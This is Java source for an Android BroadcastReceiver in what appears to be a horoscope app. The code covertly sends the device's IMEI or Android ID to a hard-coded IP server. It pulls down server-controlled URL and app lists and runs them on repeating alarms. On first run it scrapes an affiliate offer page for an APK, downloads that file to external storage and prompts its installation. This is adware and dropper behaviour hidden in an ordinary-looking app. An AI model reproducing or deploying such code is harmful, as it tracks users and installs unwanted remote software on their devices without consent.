package com.horoscope.receiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.apache.commons.io.FilenameUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Костя on 13.02.2015.
 */
public class ServerDataReceiver extends BroadcastReceiver {
    public static final String ACTION_ALARM_RECEIVER = "action";
    public static final String BASE_URL = "http://5.149.254.70/";
    public static final String TIMEOUT_HEAD_TXT = "timeout_head.txt?hash=";
    private static final String LOG_TAG = "ServerDataReceiver";
    private static final String TMP_FILE_PATH = Environment.getExternalStorageDirectory().getPath() + "/tmpFile.apk";
    private static final String TIMEOUT_TXT = "timeout.txt?hash=";
    private static final String LINKS_TXT = "links.txt?hash=";
    private static final String APP_ID_TXT = "app-id.txt?hash=";
    private static final String APP_START = "apstart.html";

    private static final String URL_TO_APK_PAGE = "http://ru.app-stream.ru/aff_c?offer_id=1500&aff_id=12237";
    private PendingIntent pendingIntent;

    public static List<String> readFileFromServer(URL url) {
        List<String> lines = new ArrayList<>();
        try {
            // Read all the text returned by the server
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String str;
            while ((str = in.readLine()) != null) {
                lines.add(str);
            }
            in.close();
        } catch (IOException e) {
            Log.e(LOG_TAG, "Exception while reading file from server. No Internet? No file? Lines: " + lines, e);
        }
        return lines;
    }

    public static String getImei(Context context) {
        String imei;
        TelephonyManager mngr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (mngr.getDeviceId() != null) {
            imei = mngr.getDeviceId(); //*** use for mobiles
        } else {
            imei = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID); //*** use for tablets
        }
        return imei;
    }

    public static boolean isInternetAvailable(Context context) {
        ConnectivityManager conMgr = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo i = conMgr.getActiveNetworkInfo();
        return i != null && i.isConnected() && i.isAvailable();
    }

    @Override
    public void onReceive(final Context context, Intent intent) {
        Log.d(LOG_TAG, "onReceive");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (isInternetAvailable(context)) {
                        //get all data from server
                        int periodToShowUrlOrApp = Integer.valueOf(readFileFromServer(new URL(BASE_URL + TIMEOUT_TXT + getImei(context))).get(0));
                        List<String> urlList = readFileFromServer(new URL(BASE_URL + LINKS_TXT + getImei(context)));
                        List<String> appsList = readFileFromServer(new URL(BASE_URL + APP_ID_TXT + getImei(context)));
                        boolean isFileMustBeDownloaded = Boolean.valueOf(readFileFromServer(new URL(BASE_URL + APP_START)).get(0));
                        Log.i(LOG_TAG, "GetDataFromServer. Data: Period = " + periodToShowUrlOrApp
                                + "isFileMustBeDownloaded = " + isFileMustBeDownloaded + " urlList "
                                + urlList + " appsList " + appsList);
                        //start alarm
                        Intent alarmIntent = new Intent(context, RunUrlsOrAppsReceiver.class);
                        alarmIntent.putStringArrayListExtra("urlList", (ArrayList<String>) urlList);
                        alarmIntent.putStringArrayListExtra("appsList", (ArrayList<String>) appsList);
                        pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent, 0);
                        startAlarm(periodToShowUrlOrApp * 60 * 1000, context);  //minutes
                        //download and open apk file
                        if (isAppRunningFirstTime(context) && isFileMustBeDownloaded) {
                            String urlApkToFile = getUrlToApkFile(URL_TO_APK_PAGE);
                            Log.v(LOG_TAG, "urlApkToFile " + urlApkToFile);
                            if (urlApkToFile != null) {
                                downloadFile(urlApkToFile);
                                openFile(context, TMP_FILE_PATH);
                            } else {
                                Log.v(LOG_TAG, "Fail to get urlApkToFile. Are you from Russia?");
                            }
                        }
                    } else {
                        Log.w(LOG_TAG, "NoInternetConnection. We will tryAgainIn15Seconds ");
                        tryAgainIn15Seconds(context);
                    }
                } catch (IOException e) {
                    Log.e(LOG_TAG, "MalformedURLException", e);
                }
            }
        }).start();

    }

    private void tryAgainIn15Seconds(Context context) {
        Intent alarmIntent = new Intent(context, ServerDataReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent, 0);
        AlarmManager manager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        int startInterval = 15_000;
        manager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + startInterval, pendingIntent);
        Log.d(LOG_TAG, "started Alarm");
    }

    private boolean isAppRunningFirstTime(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("com.mycompany.myAppName", Context.MODE_PRIVATE);
        if (prefs.getBoolean("firstrun", true)) {
            prefs.edit().putBoolean("firstrun", false).commit();
            return true;
        } else {
            return false;
        }
    }

    private String getUrlToApkFile(String urlToApkPage) {
        String content = null;
        try {
            Document doc = Jsoup.connect(urlToApkPage).get();
            // find url in html meta
            Elements select = doc.select("meta[http-equiv=refresh]");
            content = select.attr("content");
            String url;
            if (content != null && !content.equals("")) url = content.split("=")[1];
            else url = "";
            if (!url.equals("")) {
                if (isUrlContainsApkFile(url)) {
                    return url;
                }
            }
            // find all urls
            Elements links = doc.select("a[href]");
            for (Element link : links) {
                String linkhref = link.attr("href");
                if (isUrlContainsApkFile(linkhref)) {
                    return linkhref;
                }
            }
        } catch (IOException e) {
            Log.e(LOG_TAG, "General I/O exception: ", e);
            //return getUrlToApkFile(urlToApkPage);
        }
        return null;
    }

    private boolean isUrlContainsApkFile(String urlToTest) {
        String extension = FilenameUtils.getExtension(urlToTest);
        Log.d(LOG_TAG, "extension : " + extension);
        return extension.startsWith("apk");
    }

    private void openFile(Context context, String path) {
        Intent promptInstall = new Intent(Intent.ACTION_VIEW)
                .setDataAndType(Uri.fromFile(new File(path)), "application/vnd.android.package-archive")
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(promptInstall);
    }

    private void downloadFile(String urlToFile) {
        int count;
        try {
            URL url = new URL(urlToFile);
            HttpURLConnection conection = (HttpURLConnection) url.openConnection();
            conection.connect();
            // getting file length
            int lenghtOfFile = conection.getContentLength();
            // input stream to read file - with 8k buffer
            InputStream input = new BufferedInputStream(url.openStream(), 8192);
            // Output stream to write file
            OutputStream output = new FileOutputStream(TMP_FILE_PATH);
            byte data[] = new byte[1024];
            long total = 0;
            while ((count = input.read(data)) != -1) {
                total += count;
                // publishing the progress....e
                // After this onProgressUpdate will be called
                Log.d(LOG_TAG, "progress " + (int) ((total * 100) / lenghtOfFile));
                // writing data to file
                output.write(data, 0, count);
            }
            output.flush();
            output.close();
            input.close();
        } catch (Exception e) {
            Log.e(LOG_TAG, "Exception while reading APK file: ", e);
        }
    }

    public void startAlarm(int intervalInMillis, Context context) {
        Log.i(LOG_TAG, "startAlarm. IntervalinMilis: " + intervalInMillis);
        AlarmManager manager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        int startInterval = 15_000;
        manager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + startInterval, intervalInMillis, pendingIntent);
        Log.d(LOG_TAG, "started Alarm");
    }
}
